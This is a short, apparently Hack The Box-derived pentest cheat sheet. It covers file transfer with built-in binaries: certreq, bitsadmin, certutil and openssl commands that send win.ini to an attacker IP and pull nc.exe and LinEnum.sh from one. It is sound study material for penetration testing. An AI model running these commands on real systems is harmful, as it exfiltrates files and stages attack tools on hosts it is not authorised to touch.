[Windows - LOLBAS](https://lolbas-project.github.io/)
To search for download and upload functions in LOLBAS we can use **/download** or **/upload**.
[GTFOBins for Linux Binaries](https://gtfobins.github.io/)
To search for download and upload functions in LOLBAS we can use **+file download** or **+file upload**
# Windows LOLBAS
使用上述的网站可以找到对应功能的LOLBAS
## Certreq.exe
```powershell
certreq.exe -Post -config http://<attack_ip>:<port>/ c:\windows\win.ini #upload
# Receive via nc session.
```
#Tips For error -- Lower Version. Download from [here](https://github.com/juliourena/plaintext/raw/master/hackthebox/certreq.exe)
## Bitsadmin
Download FIle:
```powershell
bitsadmin /transfer wcb /priority foreground http://<attack_ip>:<port>/nc.exe C:\Users\htb-student\Desktop\nc.exe
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
## Certutil
```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

# Linux LOLBAS
## openssl
like 'nc style'
### Upload
```bash
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem #create a cert.
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh #local

#Download
openssl s_client -connect <attacker_ip>:80 -quiet > LinEnum.sh
```